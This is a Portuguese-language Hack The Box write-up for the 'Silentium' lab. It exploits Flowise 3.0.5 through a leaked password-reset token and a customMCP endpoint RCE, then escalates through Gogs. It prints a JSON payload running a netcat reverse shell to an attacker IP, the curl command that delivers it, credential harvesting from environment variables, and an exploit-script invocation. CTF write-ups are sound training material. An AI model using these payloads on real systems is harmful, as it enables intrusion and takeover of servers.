# Máquina: Silentium(Hack the box)

## Enumeração

Comecei a enumeração fazendo uma varredura de portas com o nmap para identificar serviços em execução no alvo.

<img width="675" height="80" alt="nmap" src="https://github.com/user-attachments/assets/550bbcf0-7077-48b1-96e9-bb7144b851a0" />

Descobrimos uma aplicação web em execução, então comecei a enumerar o serviço. Encontrei um possível user na aba de "colaboradores" da página principal: "Ben".

Tentei descobrir diretórios ocultos com o gobuster, mas não encontrei nada relevantes, então, enumerei os subdomínios diponíveis.

<img width="1124" height="276" alt="gobuster" src="https://github.com/user-attachments/assets/3e581dad-57ad-4bc7-90b3-d53ea4d7b66d" />

Acessando o subdomínio descoberto (staging.silentium.htb), descobri que se tratava de uma página de login da plataforma flowise, plataforma de automação de IA. 
  
<img width="1776" height="792" alt="flowise" src="https://github.com/user-attachments/assets/3b4b1e0d-baf7-48b8-a5d0-e21d4ba2693c" />

Acessei o path /api/v1/version para checar se deixaram a versão do sistema exposta e descobri que a versão do flowise é "3.0.5".  

Essa versão do flowise é vulnerável ao CVE-2025-58424, que expõe dados sensíveis no endpoint /api/v1/forgot-password. Quando o usuário pede para recuperar a senha através do email, o servidor responde com um JSON contendo um tempToken(Que deveria somente ir ao email do user).

## Exploração

Sabendo do CVE, interceptei as requisições ao forgot-password com o burpsuit e consegui o token temporário para alterar a senha através da resposta do servidor.

<img width="1108" height="505" alt="token" src="https://github.com/user-attachments/assets/91e4ebcc-c551-4df0-9a62-3a552b32b79b" />

Investigando o dashboard do admin, encontrei uma api key que pode me dar permissão para interagir com o endpoint "api/v1/node-load-method/customMCP" e ter acesso ao módulo "child_process" que me permite upar um payload reverse shell .json com script javascript e executar sem validação (RCE). 

(Abri um listener na porta 4444 na minha máquina com o netcat.)


Execuçâo:

```bash
##Preparar o payload (paylaod.json)
{
  "loadMethod": "listActions",
  "inputs": {
    "mcpServerConfig": "({x:(function(){const cp=process.mainModule.require('child_process');cp.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOUR_sIP 4444 >/tmp/f');return 1;})()} )"
  }
}
```

```bash
##upar e executar o payload
curl -s -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <ApiKey>" \
  -d @payload.json
```

Assim, consegui acesso root no docker e comecei a procurar por credenciais. Utilizei o comando env para encontrar variáveis no ambiente e encontrei a credencial do serviço smtp.

<img width="612" height="511" alt="docker" src="https://github.com/user-attachments/assets/442f3c12-cc6f-4e6f-b8b1-afcf7a792a7e" />

Testando a senha encontrada no serviço SSH com o user "Ben", consegui entrar na máquina alvo e extraí a user flag.

<img width="565" height="104" alt="userflag" src="https://github.com/user-attachments/assets/e641300d-6c05-408a-9791-813e5e72e3bd" />

## Escalação de privilégio

Enumerando o ambiente, percebi a execução do serviço "Gogs" no localhost.  

O Gogs quando possui uma versão desatualizada pode ser vulnerável a CVE-2025-8110 que é uma falha de injeção de argumentos que pode ser usada para escalar privilégios se estiver sendo executado com root. Nessa CVE, o Gogs permite que as configurações do git fossem manipuladas através de repositórios maliciosos.  

Para acessar o Gogs rodando como localhost no alvo, precisei fazer um portforwarding:

```bash
ssh -L 3001:127.0.0.1:3001 ben@<ipAlvo>
```
Criei um login no Gogs, extraí a api key e abri um listener na porta 5555 utilizando o netcat.
  
Utilizei um script em python que automatiza a injeção de argumento:
```bash
python3 exploit.py -u http://localhost:3001 -un [YOUR_USERNAME] -pw [YOUR_PASSWORD] -t SEU_TOKEN_AQUI -lh [IP] -lp 5555
```

Conseguindo um shell root, extraindo a root flag e finalizando a máquina.
<img width="267" height="109" alt="rootflag" src="https://github.com/user-attachments/assets/bfe27004-d52d-4f8d-b195-205f210e3641" />









